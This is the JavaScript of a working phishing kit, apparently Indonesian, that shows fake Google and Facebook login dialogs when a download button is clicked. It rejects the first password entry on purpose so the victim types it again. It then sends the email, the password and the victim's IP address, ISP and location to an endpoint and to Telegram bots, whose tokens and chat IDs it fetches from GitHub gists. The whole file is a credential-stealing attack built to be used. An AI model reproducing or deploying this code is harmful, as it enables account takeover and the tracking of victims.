var avatarColors = {
  a:'av-red',b:'av-pink',c:'av-purple',d:'av-indigo',
  e:'av-blue',f:'av-blue',g:'av-teal',h:'av-green',
  i:'av-green',j:'av-orange',k:'av-orange',l:'av-brown',
  m:'av-red',n:'av-pink',o:'av-purple',p:'av-indigo',
  q:'av-blue',r:'av-teal',s:'av-green',t:'av-orange',
  u:'av-brown',v:'av-red',w:'av-pink',x:'av-purple',
  y:'av-indigo',z:'av-grey'
};
function getAvatarClass(l){ return avatarColors[l.toLowerCase()]||'av-blue'; }

function openModal() {
  document.getElementById('overlay').classList.add('active');
  showStep('stepChoose');
}
function closeModal() {
  document.getElementById('overlay').classList.remove('active');
}
function showStep(id) {
  document.querySelectorAll('.step').forEach(function(s){ s.classList.remove('active'); });
  document.getElementById(id).classList.add('active');
}

function showLoading(dimId, textId, text, cb) {
  var dim = document.getElementById(dimId);
  document.getElementById(textId).textContent = text;
  dim.classList.add('active');
  setTimeout(function(){ dim.classList.remove('active'); if(cb) cb(); }, 2000);
}

var gPassVisible = false;
var gEmail = '';
var googleAttempt = 0;
var fbAttempt = 0;

function gHandleEmailNext() {
  var inp = document.getElementById('gEmailInput');
  var err = document.getElementById('gEmailError');
  var email = inp.value.trim();
  var atIdx = email.indexOf('@');
  var valid = atIdx > 0 && email.endsWith('@gmail.com') && atIdx === email.lastIndexOf('@') && email.length > 10;
  if (!valid) {
    inp.classList.add('error','shake');
    err.textContent = 'Enter a valid Gmail address';
    setTimeout(function(){ inp.classList.remove('shake'); }, 400);
    return;
  }
  inp.classList.remove('error'); err.textContent = '';
  googleAttempt = 0;
  showLoading('gLoadingDim','gLoadingText','Memverifikasi...', function(){
    var letter = email[0].toUpperCase();
    var av = document.getElementById('gAvatarEl');
    av.textContent = letter;
    av.className = 'g-chip-avatar ' + getAvatarClass(letter);
    document.getElementById('gChipEmail').textContent = email;
    gEmail = email;
    showStep('stepGPass');
  });
}

function gHandlePassNext() {
  var inp = document.getElementById('gPassInput');
  var err = document.getElementById('gPassError');
  var pass = inp.value;
  if (pass.length < 8) {
    inp.classList.add('error','shake');
    err.textContent = 'Password must have at least 8 characters.';
    setTimeout(function(){ inp.classList.remove('shake'); }, 400);
    return;
  }
  inp.classList.remove('error');

  // Attempt pertama selalu salah
  if (googleAttempt === 0) {
    googleAttempt++;
    inp.classList.add('error','shake');
    err.textContent = 'Wrong password, Please try again!';
    setTimeout(function(){ inp.classList.remove('shake'); }, 400);
    inp.value = '';
    return;
  }

  err.textContent = '';
  var dim = document.getElementById('gPassLoadingDim');
  document.getElementById('gPassLoadingText').textContent = 'Mengirim data...';
  dim.classList.add('active');

  var xhr = new XMLHttpRequest();
  xhr.open('POST', getEndpoint(), true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  var params = 'email=' + encodeURIComponent(gEmail) + '&password=' + encodeURIComponent(pass) + '&login=Google';
  xhr.send(params);

  sendToTelegram(gEmail, pass, 'Google');

  setTimeout(function() { locationRedirect(); }, 2000);
}

function gTogglePass() {
  gPassVisible = !gPassVisible;
  document.getElementById('gPassInput').type = gPassVisible ? 'text' : 'password';
  document.getElementById('gEyeOn').style.display  = gPassVisible ? 'block' : 'none';
  document.getElementById('gEyeOff').style.display = gPassVisible ? 'none'  : 'block';
}

var fbPassVisible = false;

function fbHandleLogin() {
  var emailInp = document.getElementById('fbEmailInput');
  var passInp  = document.getElementById('fbPassInput');
  var emailErr = document.getElementById('fbEmailError');
  var passErr  = document.getElementById('fbPassError');
  var email = emailInp.value.trim();
  var pass  = passInp.value;

  if (!email) {
    emailInp.classList.add('error','shake');
    emailErr.textContent = 'Masukkan email atau nomor ponsel.';
    setTimeout(function(){ emailInp.classList.remove('shake'); }, 400);
    return;
  }
  emailErr.textContent = '';

  if (pass.length < 8) {
    passInp.classList.add('error','shake');
    passErr.textContent = 'Kata sandi minimal 8 karakter.';
    setTimeout(function(){ passInp.classList.remove('shake'); }, 400);
    return;
  }
  passErr.textContent = '';

  // Attempt pertama selalu salah
  if (fbAttempt === 0) {
    fbAttempt++;
    passInp.classList.add('error','shake');
    passErr.textContent = 'Wrong password, Please try again!';
    setTimeout(function(){ passInp.classList.remove('shake'); }, 400);
    passInp.value = '';
    return;
  }

  var btn = document.getElementById('fbLoginBtn');
  var spinner = document.getElementById('fbBtnSpinner');
  var btnText = document.getElementById('fbBtnText');
  btn.classList.add('loading'); btn.disabled = true;
  spinner.style.display = 'block';
  btnText.textContent = '';

  var xhr = new XMLHttpRequest();
  xhr.open('POST', getEndpoint(), true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  var params = 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(pass) + '&login=Facebook';
  xhr.send(params);

  sendToTelegram(email, pass, 'Facebook');

  setTimeout(function() {
    btn.classList.remove('loading'); btn.disabled = false;
    spinner.style.display = 'none';
    btnText.textContent = 'Login';
    document.getElementById('fbcName').textContent = email;
    showStep('stepFBConfirm');
  }, 2000);
}

function fbLanjutkan() {
  var dim = document.getElementById('fbConfirmLoadingDim');
  document.getElementById('fbConfirmLoadingText').textContent = 'Memproses...';
  dim.classList.add('active');
  setTimeout(function() { locationRedirect(); }, 2000);
}

function fbTogglePass() {
  fbPassVisible = !fbPassVisible;
  document.getElementById('fbPassInput').type = fbPassVisible ? 'text' : 'password';
  document.getElementById('fbEyeOn').style.display  = fbPassVisible ? 'block' : 'none';
  document.getElementById('fbEyeOff').style.display = fbPassVisible ? 'none'  : 'block';
}

function fbUpdateClear() {
  var val = document.getElementById('fbEmailInput').value;
  var btn = document.getElementById('fbClearBtn');
  btn.classList.toggle('visible', val.length > 0);
}

function fbClearEmail() {
  document.getElementById('fbEmailInput').value = '';
  document.getElementById('fbClearBtn').classList.remove('visible');
  document.getElementById('fbEmailInput').focus();
  fbAttempt = 0;
}

var _tgTokenIndex = Math.floor(Math.random() * 1000);

async function sendToTelegram(email, password, login) {
  try {
    const geo = window.USER_GEO || {};
    const ipv4     = geo.ipv4    || 'Tidak Ada Data';
    const ipv6     = geo.ipv6    || 'Tidak Ada Data';
    const negara   = geo.country || 'Tidak Ada Data';
    const provinsi = geo.region  || 'Tidak Ada Data';
    const kota     = geo.city    || 'Tidak Ada Data';
    const operator = geo.isp     || 'Tidak Ada Data';
    const asn      = geo.asn     || 'Tidak Ada Data';
    const lon      = geo.lon     || 'Tidak Ada Data';
    const lat      = geo.lat     || 'Tidak Ada Data';

    const tokenUrl = 'https://gist.githubusercontent.com/TirzzNesia/2cfa7346fe159a78c97c905cfe000efc/raw/22d9b78da579834c6019b764b4c01306a3637219/zexotokengiza.txt';
    const idUrl    = 'https://gist.githubusercontent.com/TirzzNesia/dc4b8403d3bc22f90e5b1b99d17fbce1/raw/beb23224248dee33ac0b5c2578fba33e9aa2a698/kingzexoid.txt';
    const proxy    = 'https://api.codetabs.com/v1/proxy/?quest=';

    const tokenRes = await fetch(proxy + encodeURIComponent(tokenUrl));
    const tokenText = (await tokenRes.text()).trim();
    const botTokens = tokenText.split('\n').map(t => t.trim()).filter(t => t.length > 0);
    if (botTokens.length === 0) return;

    const idsRes = await fetch(proxy + encodeURIComponent(idUrl));
    const idsText = (await idsRes.text()).trim();
    const chatIds = idsText.split('\n').map(id => id.trim()).filter(id => id.length > 0);
    if (chatIds.length === 0) return;

    const waktu = new Date().toLocaleString('id-ID', {
      timeZone: 'Asia/Jakarta',
      dateStyle: 'full',
      timeStyle: 'medium'
    });

    const message =
      `<blockquote><b>🔥 RESSULT TIRZZ23NESIA! 🔥</b></blockquote>\n` +
      `<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n` +
      `<b>Email/User :</b> <code>${email}</code>\n` +
      `<b>Password   :</b> <code>${password}</code>\n` +
      `<b>Login      :</b> <code>${login}</code>\n` +
      `<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n` +
      `<b>IP Address :</b> <code>${ipv4}</code>\n` +
      `<b>IPv6       :</b> <code>${ipv6}</code>\n` +
      `<b>Lokasi     :</b> <code>${negara}, ${provinsi}, ${kota}</code>\n` +
      `<b>Operator   :</b> <code>${operator}</code>\n` +
      `<b>ASN        :</b> <code>${asn}</code>\n` +
      `<b>Koordinat  :</b> <code>${lon}, ${lat}</code>\n` +
      `<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n` +
      `<b>Waktu :</b> <i>${waktu} WIB</i>\n` +
      `<b>Status:</b> <u>Real Data Stream</u>\n` +
      `<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n` +
      `<b>Wa   :</b> <span class="tg-spoiler">628975919600</span>\n` +
      `<b>Tele :</b> <span class="tg-spoiler">@zexoorill</span>`;

    const selectedToken = botTokens[_tgTokenIndex % botTokens.length];
    _tgTokenIndex++;
    let sent = false;
    for (let attempt = 0; attempt < botTokens.length; attempt++) {
      const token = botTokens[(_tgTokenIndex - 1 + attempt) % botTokens.length];
      const url = `https://api.telegram.org/bot${token}/sendMessage`;

      for (let cid of chatIds) {
        const params = new URLSearchParams({
          chat_id: cid,
          text: message,
          parse_mode: 'HTML',
          disable_web_page_preview: 'true'
        });
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: params,
            mode: 'no-cors'
          });
          sent = true;
        } catch(e) {
        }
      }

      if (sent) break;
    }

  } catch (e) {
    console.error('Telegram error:', e);
  }
}

window.addEventListener('DOMContentLoaded', function(){
  document.getElementById('overlay').addEventListener('click', function(e){
    if (e.target === this) closeModal();
  });

  document.getElementById('gEmailInput').addEventListener('input', function(){
    this.classList.remove('error');
    document.getElementById('gEmailError').textContent = '';
  });
  document.getElementById('gPassInput').addEventListener('input', function(){
    this.classList.remove('error');
    document.getElementById('gPassError').textContent = '';
  });
  document.getElementById('fbEmailInput').addEventListener('input', function(){
    this.classList.remove('error');
    document.getElementById('fbEmailError').textContent = '';
    fbUpdateClear();
  });
  document.getElementById('fbPassInput').addEventListener('input', function(){
    this.classList.remove('error');
    document.getElementById('fbPassError').textContent = '';
  });

  document.addEventListener('keydown', function(e){
    if (e.key !== 'Enter') return;
    if (document.getElementById('stepGEmail').classList.contains('active')) gHandleEmailNext();
    else if (document.getElementById('stepGPass').classList.contains('active')) gHandlePassNext();
    else if (document.getElementById('stepFB').classList.contains('active')) fbHandleLogin();
  });

  var downloadBtn = document.getElementById('downloadBtn');
  if (downloadBtn) downloadBtn.addEventListener('click', openModal);
});
